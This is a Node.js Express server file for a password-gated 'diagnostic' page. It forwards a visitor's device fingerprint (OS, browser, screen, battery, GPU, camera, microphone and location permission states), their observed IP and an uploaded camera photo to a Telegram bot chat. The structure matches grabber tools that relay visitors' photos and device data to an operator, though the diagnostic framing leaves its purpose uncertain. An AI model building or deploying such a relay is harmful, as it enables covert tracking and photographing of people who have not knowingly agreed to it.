"use strict";

const express = require("express");
const session = require("express-session");
const dotenv = require("dotenv");
const path = require("path");
const multer = require("multer");

dotenv.config();

const app = express();
const PORT = Number(process.env.PORT) || 3000;

/*
 * =========================================================
 * CONFIG
 * =========================================================
 */

const PASSWORD = process.env.SITE_PASSWORD;
const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID = process.env.TELEGRAM_CHAT_ID;

if (!PASSWORD) {
    console.warn(
        "WARNING: PASSWORD is not configured in .env"
    );
}

if (!BOT_TOKEN || !CHAT_ID) {
    console.warn(
        "WARNING: BOT_TOKEN or CHAT_ID is not configured."
    );
}


/*
 * =========================================================
 * MIDDLEWARE
 * =========================================================
 */

app.disable("x-powered-by");

app.use(
    express.json({
        limit: "1mb"
    })
);

app.use(
    express.urlencoded({
        extended: false
    })
);

app.use(
    session({
        secret:
            process.env.SESSION_SECRET ||
            "change-this-session-secret",

        resave: false,

        saveUninitialized: false,

        cookie: {
            httpOnly: true,
            sameSite: "lax",
            secure:
                process.env.NODE_ENV === "production",

            maxAge:
                1000 * 60 * 60 * 8
        }
    })
);


/*
 * =========================================================
 * STATIC FILES
 * =========================================================
 */

app.use(
    express.static(
        path.join(__dirname, "public")
    )
);


/*
 * =========================================================
 * AUTHENTICATION
 * =========================================================
 */

function requireAuth(req, res, next) {
    if (
        !req.session ||
        req.session.authenticated !== true
    ) {
        return res.status(401).json({
            success: false,
            message: "Authentication required."
        });
    }

    next();
}


app.get(
    "/api/auth",
    (req, res) => {
        res.setHeader(
            "Cache-Control",
            "no-store"
        );

        res.json({
            authenticated:
                req.session?.authenticated === true
        });
    }
);


app.post(
    "/api/login",
    (req, res) => {
        const password =
            typeof req.body?.password === "string"
                ? req.body.password
                : "";

        if (
            !PASSWORD ||
            password !== PASSWORD
        ) {
            return res.status(401).json({
                success: false,
                message: "Incorrect password."
            });
        }

        req.session.authenticated = true;

        res.json({
            success: true
        });
    }
);


app.post(
    "/api/logout",
    requireAuth,
    (req, res) => {
        req.session.destroy(() => {
            res.json({
                success: true
            });
        });
    }
);


/*
 * =========================================================
 * SERVER-OBSERVED IP
 * =========================================================
 */

function getClientIp(req) {
    /*
     * In local development this can be:
     * ::1
     * 127.0.0.1
     *
     * Behind a trusted reverse proxy, configure
     * trust proxy appropriately before relying on
     * forwarded headers.
     */

    const remoteAddress =
        req.socket?.remoteAddress ||
        "";

    return remoteAddress;
}


app.get(
    "/api/ip",
    requireAuth,
    (req, res) => {
        res.setHeader(
            "Cache-Control",
            "no-store"
        );

        res.json({
            success: true,
            ip: getClientIp(req)
        });
    }
);


/*
 * =========================================================
 * DIAGNOSTIC REPORT
 * =========================================================
 */

function sanitizeReport(report) {
    if (
        !report ||
        typeof report !== "object"
    ) {
        return {};
    }

    /*
     * Keep the report JSON-size bounded.
     */

    const serialized =
        JSON.stringify(report);

    if (
        serialized.length > 100000
    ) {
        return {};
    }

    return report;
}


function buildTelegramCaption(
    report,
    ip
) {
    const device =
        report.device || {};

    const browser =
        report.browser || {};

    const display =
        report.display || {};

    const network =
        report.network || {};

    const battery =
        report.battery || {};

    const graphics =
        report.graphics || {};

    const permissions =
        report.permissions || {};

    return [
        "🖥 DEVICE DIAGNOSTIC",
        "",
        `OS: ${device.operatingSystem || "N/A"}`,
        `Platform: ${device.platform || "N/A"}`,
        `Device: ${device.deviceType || "N/A"}`,
        `CPU Cores: ${device.cpuCores || "N/A"}`,
        `Memory: ${device.memory || "N/A"}`,
        "",
        "🌐 BROWSER",
        "",
        `Browser: ${browser.browser || "N/A"}`,
        `Version: ${browser.version || "N/A"}`,
        `Language: ${browser.language || "N/A"}`,
        `Timezone: ${browser.timezone || "N/A"}`,
        "",
        "📺 DISPLAY",
        "",
        `Resolution: ${display.resolution || "N/A"}`,
        `Viewport: ${display.viewport || "N/A"}`,
        `Pixel Ratio: ${display.devicePixelRatio || "N/A"}`,
        "",
        "🌐 NETWORK",
        "",
        `Public/Observed IP: ${ip || "N/A"}`,
        `Connection: ${network.effectiveType || "N/A"}`,
        `Downlink: ${network.downlink || "N/A"}`,
        `RTT: ${network.rtt || "N/A"}`,
        "",
        "🔋 BATTERY",
        "",
        `Level: ${battery.level || "N/A"}`,
        `Charging: ${battery.charging || "N/A"}`,
        "",
        "🎮 GRAPHICS",
        "",
        `GPU: ${graphics.gpu || "N/A"}`,
        "",
        "🔐 PERMISSIONS",
        "",
        `Location: ${permissions.geolocation || "N/A"}`,
        `Camera: ${permissions.camera || "N/A"}`,
        `Microphone: ${permissions.microphone || "N/A"}`,
        `Notifications: ${permissions.notifications || "N/A"}`,
        "",
        `🕒 ${report.timestamp || new Date().toISOString()}`
    ].join("\n");
}


async function sendTelegramMessage(
    caption
) {
    const url =
        `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

    const response =
        await fetch(
            url,
            {
                method: "POST",

                headers: {
                    "Content-Type":
                        "application/json"
                },

                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: caption
                })
            }
        );

    const data =
        await response.json();

    if (
        !response.ok ||
        !data.ok
    ) {
        throw new Error(
            "Telegram sendMessage failed."
        );
    }

    return data;
}


/*
 * Normal diagnostic report.
 *
 * This endpoint is authenticated.
 */

app.post(
    "/api/report",
    requireAuth,
    async (req, res) => {
        try {
            const report =
                sanitizeReport(
                    req.body
                );

            const ip =
                getClientIp(req);

            if (!BOT_TOKEN || !CHAT_ID) {
                return res.status(500).json({
                    success: false,
                    message:
                        "Telegram configuration is missing."
                });
            }

            const caption =
                buildTelegramCaption(
                    report,
                    ip
                );

            await sendTelegramMessage(
                caption
            );

            res.json({
                success: true
            });

        } catch (error) {
            console.error(
                "Diagnostic report error:",
                error
            );

            res.status(500).json({
                success: false,
                message:
                    "Unable to send diagnostic report."
            });
        }
    }
);


/*
 * =========================================================
 * PHOTO UPLOAD
 * =========================================================
 */

const upload =
    multer({
        storage:
            multer.memoryStorage(),

        limits: {
            fileSize:
                5 * 1024 * 1024
        },

        fileFilter:
            (req, file, callback) => {

                const allowed =
                    [
                        "image/jpeg",
                        "image/png",
                        "image/webp"
                    ];

                if (
                    allowed.includes(
                        file.mimetype
                    )
                ) {
                    callback(
                        null,
                        true
                    );
                } else {
                    callback(
                        new Error(
                            "Only image files are allowed."
                        )
                    );
                }
            }
    });


/*
 * Send photo + diagnostic report.
 *
 * This endpoint does NOT capture anything itself.
 * The browser must explicitly send the captured photo.
 */

app.post(
    "/api/photo-report",
    requireAuth,
    upload.single("photo"),
    async (req, res) => {
        console.log("\n========== PHOTO REPORT ==========");

        try {
            console.log("Authenticated:", req.session?.authenticated);
            console.log("Photo received:", !!req.file);

            if (!req.file) {
                console.log("ERROR: No photo received");

                return res.status(400).json({
                    success: false,
                    message: "No photo supplied."
                });
            }

            let report = {};

            try {
                report = JSON.parse(
                    req.body?.report || "{}"
                );
            } catch (error) {
                console.log(
                    "ERROR: Invalid report JSON"
                );

                return res.status(400).json({
                    success: false,
                    message: "Invalid report data."
                });
            }

            console.log(
                "Report received:",
                Object.keys(report)
            );

            const ip =
                getClientIp(req);

            console.log(
                "Server observed IP:",
                ip
            );

            console.log(
                "Telegram configured:",
                !!BOT_TOKEN && !!CHAT_ID
            );

            const caption =
                buildTelegramCaption(
                    report,
                    ip
                );

            const form =
                new FormData();

            form.append(
                "chat_id",
                CHAT_ID
            );

            form.append(
                "caption",
                caption
            );

            form.append(
                "photo",
                new Blob(
                    [req.file.buffer],
                    {
                        type:
                            req.file.mimetype
                    }
                ),
                "diagnostic-photo.jpg"
            );

            console.log(
                "Sending photo to Telegram..."
            );

            const telegramUrl =
                `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;

            const telegramResponse =
                await fetch(
                    telegramUrl,
                    {
                        method: "POST",
                        body: form
                    }
                );

            const telegramData =
                await telegramResponse.json();

            console.log(
                "Telegram status:",
                telegramResponse.status
            );

            console.log(
                "Telegram response:",
                telegramData
            );

            if (
                !telegramResponse.ok ||
                !telegramData.ok
            ) {
                return res.status(502).json({
                    success: false,
                    message:
                        telegramData.description ||
                        "Telegram delivery failed."
                });
            }

            console.log(
                "SUCCESS: Report sent to Telegram"
            );

            console.log(
                "================================\n"
            );

            res.json({
                success: true
            });

        } catch (error) {

            console.error(
                "PHOTO REPORT ERROR:",
                error
            );

            console.log(
                "================================\n"
            );

            res.status(500).json({
                success: false,
                message:
                    error.message ||
                    "Unable to send photo report."
            });
        }
    }
);


/*
 * =========================================================
 * ERROR HANDLER
 * =========================================================
 */

app.use(
    (error, req, res, next) => {
        console.error(
            "Server error:",
            error
        );

        if (
            error instanceof multer.MulterError
        ) {
            return res.status(400).json({
                success: false,
                message:
                    "Photo upload failed."
            });
        }

        if (
            error?.message ===
            "Only image files are allowed."
        ) {
            return res.status(400).json({
                success: false,
                message:
                    error.message
            });
        }

        res.status(500).json({
            success: false,
            message:
                "Internal server error."
        });
    }
);


/*
 * =========================================================
 * SPA FALLBACK
 * =========================================================
 */

app.use(
    (req, res) => {
        res.sendFile(
            path.join(
                __dirname,
                "public",
                "index.html"
            )
        );
    }
);


/*
 * =========================================================
 * START SERVER
 * =========================================================
 */

app.listen(
    PORT,
    () => {
        console.log(
            `Testing-URL running at http://localhost:${PORT}`
        );
    }
);